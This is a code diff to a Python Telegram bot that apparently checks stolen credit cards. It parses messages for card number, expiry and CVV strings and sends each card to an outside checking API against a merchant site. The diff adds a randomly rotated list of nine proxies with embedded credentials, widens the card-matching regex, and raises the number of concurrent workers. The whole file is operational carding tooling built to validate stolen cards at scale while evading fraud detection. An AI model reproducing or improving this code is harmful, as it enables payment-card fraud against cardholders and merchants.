@@ -6,6 +6,7 @@ from telethon.sessions import StringSession
 from telegram import Bot
 from telegram.helpers import escape_markdown
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+import random
 
 # ---------------- CONFIG ----------------
 api_id = 17455551
@@ -19,10 +20,26 @@ ADMIN_ID = 8493360284  # Your Telegram ID
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
-PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 
-CARD_REGEX = re.compile(r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})")
-NUM_WORKERS = 10  # concurrent workers
+# List of proxies (rotate randomly)
+PROXIES = [
+    "45.41.172.51:5794:juftilus:atasaxde44jl",
+    "45.41.177.238:5888:juftilus:atasaxde44jl",
+    "92.113.7.244:6970:juftilus:atasaxde44jl",
+    "108.165.197.189:6428:juftilus:atasaxde44jl",
+    "23.27.209.235:6254:juftilus:atasaxde44jl",
+    "82.29.225.78:5933:juftilus:atasaxde44jl",
+    "23.27.184.87:5688:juftilus:atasaxde44jl",
+    "31.59.27.148:6725:juftilus:atasaxde44jl",
+    "67.227.113.12:5552:juftilus:atasaxde44jl"
+]
+
+# Regex to match multiple card formats
+CARD_REGEX = re.compile(
+    r"(\d{15,16})\s*[\/|]?\s*(\d{2})[\/|]?(\d{2,4})\s*[\/|]?\s*(\d{3,4})"
+)
+
+NUM_WORKERS = 15  # number of concurrent workers
 
 # ---------------- CLIENTS ----------------
 user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
@@ -37,7 +54,8 @@ session = None  # aiohttp session
 async def process_card(card: str):
     """Send card to API and forward result if dropping enabled"""
     global session
-    params = {"site": SITE, "cc": card, "proxy": PROXY}
+    proxy = random.choice(PROXIES)
+    params = {"site": SITE, "cc": card, "proxy": proxy}
 
     try:
         async with session.get(API_URL, params=params, timeout=15) as resp:
